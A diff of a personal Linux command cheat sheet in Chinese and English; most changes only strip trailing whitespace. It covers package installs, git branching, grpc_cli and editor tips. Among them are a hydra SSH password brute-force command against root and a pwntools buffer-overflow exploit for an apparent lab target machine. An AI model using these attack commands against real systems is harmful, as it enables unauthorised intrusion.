@@ -1,4 +1,4 @@
-#====== unrar & rar ====== 
+#====== unrar & rar ======
 
 sudo dnf install -y https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-34.noarch.rpm
 sudo dnf install -y https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-34.noarch.rpm
@@ -6,7 +6,7 @@ sudo dnf install -y unrar
 
 #====== 无线网卡驱动安装 ======
 unzip ../tools/Qualcomm-Atheros-QCA9377-Wifi-Linux-master.zip
-# see *.doc 
+# see *.doc
 
 #====== 获取外网的ip地址 ======
 curl ipecho.net/plain
@@ -101,7 +101,7 @@ gsb
 #拉取远程分支
 git checkout -b feature-branch origin/feature-branch    #检出远程的feature-branch分支到本地
 #本地传建分支并推到远程
-git checkout -b feature-branch    #创建并切换到分支feature-branch  
+git checkout -b feature-branch    #创建并切换到分支feature-branch
 git push origin feature-branch:feature-branch    #推送本地的feature-branch(冒号前面的)分支到远程origin的feature-branch(冒号后面的)分支(没有会自动创建)
 #删除远程分支
 gp origin --delete feature-branch
@@ -149,8 +149,8 @@ lockfile a.c.bfe
 
 #====== nodejs
 curl -sL https://rpm.nodesource.com/setup_12.x | sudo bash -
-yum clean all 
-yum makecache 
+yum clean all
+yum makecache
 yum install -y nodejs
 
 #====== fonts
@@ -165,14 +165,14 @@ rm -fr DroidSansMono.zip
 #====== supervisorctl supervisord
 ```sh
 # control process group
-#offical site 
+#offical site
 http://supervisord.org/
 ```
 
 
 #====== grpc_cli
 ```sh
-#show service 
+#show service
 grpc_cli ls localhost:50051
 #show service details
 grpc_cli ls localhost:50051 helloworld.Greeter -l
@@ -180,16 +180,16 @@ grpc_cli ls localhost:50051 helloworld.Greeter -l
 grpc_cli ls localhost:50051 helloworld.Greeter.SayHello -l
 #show message type
 grpc_cli type localhost:50051 helloworld.HelloRequest
-#call a remote method 
+#call a remote method
 grpc_cli call localhost:50051 SayHello "name: 'gRPC CLI'"
 ```
 
 #-----------------------------------------------secure way
 #====== password cracking
-```sh 
-# -l username 
-# -P password dict 
-# -t thread 
+```sh
+# -l username
+# -P password dict
+# -t thread
 hydra -l root -P /root/pass.txt -t 16 192.168.110.7 ssh
 ```
 
@@ -262,25 +262,25 @@ int main() {
   return 0;
 }
 ```
-## attacker 
+## attacker
 ```sh
-# get pwn way 
+# get pwn way
 apt-get update
 apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
 python3 -m pip install --upgrade pip
 python3 -m pip install --upgrade pwntools
 
 # *.py
-from pwn import * 
-cn=remote('192.168.120.192',12345) # 靶机部署的地址 
+from pwn import *
+cn=remote('192.168.120.192',12345) # 靶机部署的地址
 cn.sendline(p64(0)*3+p64(0x4011b6))
 cn.interactive()
 ```
 
 #===== change default editor =====
-```sh 
-vim ~/.zshrc 
-export EDITOR=nvim 
+```sh
+vim ~/.zshrc
+export EDITOR=nvim
 source ~/.zshrc
 ```
 
@@ -288,7 +288,7 @@ source ~/.zshrc
 ```sh
 # into tty3 tty4 tty5 tty6
 ctrl-alt-[f3|f4|f5|f6]
-# recover 
+# recover
 ctrl-alt-[f1|f2]
 ```
 
@@ -297,7 +297,7 @@ ctrl-alt-[f1|f2]
 w!!
 wa!!
 
-#===== docker account ===== 
+#===== docker account =====
 vim ~/.docker/config.json
 {
 	"auths": {
@@ -335,7 +335,7 @@ alt-ctrl-shift-r
 chsh -s /bin/zsh
 
 #===== get language(locale) =====
-locale 
+locale
 localectl status
 
 #===== get dynamic lib =====
@@ -352,7 +352,7 @@ LD_PRELOAD="/lib64/libc-2.18.so" ln -s /lib64/libc-2.18.so /lib64/libc.so.6
 https://pkgs.org/
 
 #==== ssh debug ====
-# git use ssh 
+# git use ssh
 export GIT_SSH_COMMAND="ssh -vvv"
 
 #==== ssh recover ssh-rsa =====
